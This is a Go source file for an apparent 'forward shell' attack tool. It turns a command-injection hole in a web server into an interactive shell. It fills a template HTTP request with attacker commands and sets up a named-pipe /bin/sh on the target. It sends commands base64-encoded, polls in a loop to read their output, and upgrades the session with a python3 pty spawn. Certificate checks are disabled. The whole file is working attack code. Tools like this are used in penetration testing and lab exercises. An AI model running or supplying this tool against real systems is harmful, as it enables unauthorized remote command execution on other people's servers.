package webshell

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// WebShell holds the information for the shell to work
type WebShell struct {
	PayloadPath string
	ReqPath     string
	Client      *http.Client
	Proxy       string
	Session     int
	Stdin       string
	Stdout      string
	Interval    int
}

// Init will create the fifo channel and set proxy if needed
func (w *WebShell) Init(ctx context.Context) {
	// Init http client
	w.Client = &http.Client{}

	// Ignore Self-Signed certs
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	// Set proxy if provided
	if w.Proxy != "" {
		proxyURL, err := url.Parse(w.Proxy)
		if err != nil {
			fmt.Printf("Error parsing proxy url: %s\n", err)
			os.Exit(1)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	// Set clients transport accordingly
	w.Client.Transport = transport

	// Setup Shell
	fmt.Printf("[*] Session ID: %d\n", w.Session)
	fmt.Println("[*] Setting up fifo shell on target")
	mkNamedPipes := fmt.Sprintf("mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s", w.Stdin, w.Stdin, w.Stdout)
	w.RunRawCmd(mkNamedPipes, 100)

	// Launch read routine
	fmt.Println("[*] Setting up read thread")
	go w.ReadRoutine(ctx)

}

// RunRawCmd will run the command using the payload against the target
func (w *WebShell) RunRawCmd(cmd string, timeout float64) string {
	var err error
	var respBody []byte

	// Parse request from cmd
	req, err := w.ParseRequest(cmd)
	if err != nil {
		fmt.Printf("Error parsing the request: %s\n", err)
		os.Exit(1)
	}

	if timeout > 0 {
		// Timeout
		ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*time.Duration(timeout))
		defer cancel()

		req = req.WithContext(ctx)
	}

	// Do request
	resp, err := w.Client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	// If done read body and return
	if resp.StatusCode == http.StatusOK {
		respBody, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return ""
		}

		return string(respBody)
	}

	return ""
}

// WriteCmd will stage the command to be base64
func (w *WebShell) WriteCmd(cmd string) {
	cmd = strings.TrimSuffix(cmd, "\n")
	b64cmd := base64.StdEncoding.EncodeToString([]byte(cmd + "\n"))
	stageCmd := fmt.Sprintf("echo %s | base64 -d > %s", b64cmd, w.Stdin)
	w.RunRawCmd(stageCmd, 50)
	time.Sleep(time.Second * time.Duration(w.Interval))
}

// UpgradeShell will leverage python3 pty trick
func (w *WebShell) UpgradeShell() {
	upgradeShell := "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
	w.WriteCmd(upgradeShell)
}

// ReadRoutine is the go subroutine to read from stdout file
func (w *WebShell) ReadRoutine(ctx context.Context) {
	// Base64 encode the read command
	getOutput := fmt.Sprintf("/bin/cat %s", w.Stdout)
	b64cmd := base64.StdEncoding.EncodeToString([]byte(getOutput + "\n"))
	stageCmd := fmt.Sprintf("echo %s | base64 -d | bash", b64cmd)

	// Base64 encode the clear command
	clearOutput := fmt.Sprintf("echo -n '' > %s", w.Stdout)
	clearB64cmd := base64.StdEncoding.EncodeToString([]byte(clearOutput + "\n"))
	clearStage := fmt.Sprintf("echo %s | base64 -d | bash", clearB64cmd)

	// Infinite read loop
	for {
		result := w.RunRawCmd(stageCmd, 0)
		if result != "" {
			fmt.Println(result)
			w.RunRawCmd(clearStage, 50)
		}
		select {
		case <-ctx.Done():
			return
		default:
			time.Sleep(time.Second * time.Duration(w.Interval))
		}
	}
}

// ParseRequest will read the request and payload file and craft a http request out of it
func (w *WebShell) ParseRequest(cmd string) (*http.Request, error) {
	var b bytes.Buffer
	var processedPayload string

	// Add surrounding payload if set
	if w.PayloadPath != "" {
		payloadFile, err := os.Open(w.PayloadPath)
		if err != nil {
			return nil, fmt.Errorf("%w", err)
		}
		defer payloadFile.Close()

		payloadScanner := bufio.NewScanner(payloadFile)
		for payloadScanner.Scan() {
			line := payloadScanner.Text()
			if strings.Contains(line, "@@cmd@@") {
				line = strings.ReplaceAll(line, "@@cmd@@", cmd)
			}
			processedPayload += line
		}
	} else { // just use cmd and add it below
		processedPayload = cmd
	}

	processedPayload += "\n"

	// Open file
	reqFile, err := os.Open(w.ReqPath)
	if err != nil {
		return nil, fmt.Errorf("%w", err)
	}
	defer reqFile.Close()

	// Read file line by line, substitute insertion point with payload
	reqScanner := bufio.NewScanner(reqFile)
	for reqScanner.Scan() {
		line := reqScanner.Text()
		if strings.Contains(line, "@@payload@@") {
			line = strings.ReplaceAll(line, "@@payload@@", processedPayload)
		}
		b.WriteString(line + "\n")
	}

	// Craft request
	parsedRequest := bufio.NewReader(&b)
	req, err := http.ReadRequest(parsedRequest)
	if err != nil && err != io.EOF {
		return nil, fmt.Errorf("%w", err)
	}

	// Reformat url for the request to work
	urlFormat := fmt.Sprintf("%s://%s%s", strings.ToLower(strings.Split(req.Proto, "/")[0]), req.Host, req.RequestURI)
	req.RequestURI = ""
	req.URL, err = url.Parse(urlFormat)
	if err != nil {
		return nil, fmt.Errorf("%w", err)
	}

	return req, nil
}

// Loop is the main loop of the shell
func (w *WebShell) Loop(ctx context.Context, cancel context.CancelFunc, exitCh chan struct{}) {
	inBuf := bufio.NewReader(os.Stdin)
	prompt := "go-forward-shell$ "

	for {
		fmt.Print(prompt)
		cmd, err := inBuf.ReadString('\n')
		if err != nil {
			fmt.Printf("Error reading in the command: %s\n", err)
			os.Exit(1)
		}

		cmd = strings.TrimSuffix(cmd, "\n")

		switch {
		case cmd == "upgrade":
			prompt = ""
			w.UpgradeShell()
		case cmd == "exit":
			cancel()
			fmt.Println("Exiting")
			time.Sleep(500 * time.Millisecond)
			exitCh <- struct{}{}

			return
		default:
			w.WriteCmd(cmd)
		}

		select {
		case <-ctx.Done():
			fmt.Println("Exiting")
			time.Sleep(500 * time.Millisecond)
			exitCh <- struct{}{}

			return
		default:
		}
	}
}
